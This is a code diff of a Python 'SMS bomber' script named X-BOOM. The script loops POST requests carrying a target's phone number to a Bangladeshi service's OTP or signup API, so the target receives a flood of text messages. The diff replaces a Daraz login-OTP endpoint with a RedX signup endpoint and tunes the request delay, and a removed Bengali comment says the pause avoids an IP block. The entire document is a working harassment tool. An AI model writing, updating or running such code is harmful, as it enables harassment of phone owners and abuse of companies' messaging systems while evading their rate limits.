@@ -7,28 +7,25 @@ def banner():
     print("========================================")
     print("        WELCOME TO X-BOOM TOOL          ")
     print("     Created by: mmalekislam788         ")
-    print("     Status: HIGH POWER API ACTIVE      ")
+    print("     Status: REDX API ACTIVE (2026)     ")
     print("========================================")
 
 def send_sms(target, count):
-    # বর্তমানে সচল একটি শক্তিশালী API (Daraz)
-    url = "https://member-gateway.daraz.com.bd/membership/gw/otp/send"
-    payload = {"phoneNumber": target, "otpType": "LOGIN"}
+    # REDX Sourcing API
+    url = "https://api.redx.com.bd/v1/user/signup"
+    payload = {"phone": target}
     
     print(f"\n[+] Global Attack started on: {target}")
     for i in range(count):
         try:
-            # Request sending
             response = requests.post(url, json=payload)
             if response.status_code == 200:
                 print(f"[!] SMS {i+1} sent successfully!")
             else:
-                print(f"[?] Failed (Server Busy) SMS {i+1}")
+                print(f"[?] Failed (Limit) SMS {i+1}")
         except:
             print(f"[-] Network Error at SMS {i+1}")
-        
-        # ৪ সেকেন্ড বিরতি দিলে আপনার আইপি ব্লক হবে না
-        time.sleep(4)
+        time.sleep(3)
 
 def main():
     banner()
